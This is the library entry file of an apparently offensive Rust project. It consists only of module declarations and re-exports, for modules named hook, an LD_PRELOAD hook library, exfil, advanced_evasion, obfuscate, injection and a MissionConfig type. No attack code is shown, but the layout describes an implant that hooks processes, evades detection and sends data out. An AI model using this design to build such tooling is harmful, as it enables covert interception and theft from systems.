// Library entry point for shared library builds
pub mod hook;
#[cfg(target_os = "linux")]
pub mod hook_lib; // LD_PRELOAD hook library (separate cdylib)
pub mod exfil;
pub mod crypto;
pub mod buffer;
pub mod advanced_evasion;
pub mod quantum_obfuscation;
pub mod error_handling;
pub mod logging;
pub mod obfuscate;
pub mod config;
pub mod injection;
pub mod proto;

// Re-export commonly used types
pub use crypto::CryptoManager;
pub use hook::HookManager;
pub use buffer::RingBuffer;
pub use logging::{Metrics, Logger};
pub use config::MissionConfig;

